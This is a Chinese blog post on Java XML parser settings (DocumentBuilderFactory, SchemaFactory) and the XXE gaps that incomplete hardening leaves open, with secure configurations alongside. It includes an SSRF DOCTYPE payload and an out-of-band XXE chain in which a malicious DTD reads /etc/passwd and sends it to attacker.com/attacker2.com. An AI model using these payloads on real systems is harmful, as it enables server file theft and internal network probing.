---
title: "Java XML 解析器配置问题"
author: ["4shen0ne"]
lastmod: 2024-12-14T01:38:16+08:00
tags: ["java"]
draft: false
---

默认情况下，Java 的 XML 解析库都会提供 DTD 处理功能和外部实体功能，这些特性通常
会导致 XXE 漏洞。开发者可以通过禁用这些特性来避免安全问题，但在某些情况下开发者的
配置可能并不完善，不能完全避免所有攻击


## javax.xml.parsers.DocumentBuilderFactory {#javax-dot-xml-dot-parsers-dot-documentbuilderfactory}

DocumentBuilderFactory 类的默认配置如下：

```java
File fXmlFile = new File("Test.xml");
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();
Document doc = dBuilder.parse(fXmlFile);
```

开发者可能使用以下代码禁用外部实体：

```java
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
// OR
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false)
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

由于代码还是会处理 DTD, 可以通过以下 payload 进行 SSRF 攻击：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE myPublicEntity PUBLIC '-//W3C//DTD HTML 4.01//EN'
'http://someIP:4444/IMMUNITY' >
```

要防御 SSRF 攻击需要以下设置：

```java
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
// or disable the DTDs completely
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

另外还要注意一个极具误导性的配置，该配置貌似只能防御 DOS：

```text
dbf.setAttribute(XMLConstants.FEATURE_SECURE_PROCESSING, true);
```


## javax.xml.validation.SchemaFactory {#javax-dot-xml-dot-validation-dot-schemafactory}

SchemaFactory 类通常会这样使用（存在 XXE）：

```java
String filepath = "Test_Schema.xml";
String xmlSchema = new String(Files.readAllBytes(Paths.get(filepath)));

SchemaFactory factory = SchemaFactory.newInstance("http://www.w3.org/2001/XMLSchema");
Schema schema = factory.newSchema(new StreamSource(new StringReader(xmlSchema)));
```

通过以下配置禁用外部实体引用：

```java
factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
```

假如 ACCESS_EXTERNAL_DTD 属性设置成了 file（只允许使用 file 协议），那么 ftp 协
议也依旧能正常使用，因此可以通过以下步骤读取数据：

1.  启动一个 ftp 服务器，在上面放一个恶意文件 evil_ftp.dtd
    ```xml
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % param1 "<!ENTITY send SYSTEM 'file://attacker2.com:5555/%file;'>">
    %param1;
    ```

2.  启动另一个 ftp 服务器用来接收数据

3.  向目标发送恶意 payload, 然后在 2 的 ftp 服务器中可以看到数据
    ```xml
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE data [
      <!ENTITY % dtd SYSTEM  "file://attacker.com:5555/evil_ftp.dtd">
      %dtd;
    ]>
    <data>&send;</data>
    ```

注意：虽然上面的 payload 使用了 5555 端口，但实际请求的依然是默认的 ftp 端口(21)
